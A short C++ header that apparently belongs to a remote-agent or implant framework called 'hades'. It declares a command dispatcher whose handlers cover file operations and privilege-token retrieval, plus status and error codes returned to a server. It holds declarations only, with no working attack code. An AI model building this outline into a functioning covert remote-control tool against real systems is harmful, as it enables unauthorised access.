#pragma once
#include "../hades/hades.h"


// todo fix these, right now calling g_ByteMgr->EndErr(*_SUCCESS), confusing when read, check do_rm() for example
// update g_ByteMgr->EndOK() to take a status, server checks if > 1, if so lookup in StatusCodeMap to get success string
#define CP_SUCCESS    488
#define CD_SUCCESS    489 
#define RM_SUCCESS	  490
#define RMDIR_SUCCESS 491 
#define MV_SUCCESS    492
#define MKDIR_SUCCESS 493


#define ERROR_OUT_OF_MEMORY 550
#define ERROR_TOKEN_SIZE 551
#define ERROR_FAILED_TOKENS 552
#define ERROR_LOOKUPPRIV_FAILED 553

class commanders {

	void do_mv();
	void do_getprivs();
	void do_pwd();
	void do_cat();
	void do_rm();
	void do_ls();
	void do_cd();
	void do_cp();
	void do_rmdir();
	void do_mkdir();


public:
	BOOL Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer);
};

extern commanders* g_Commander;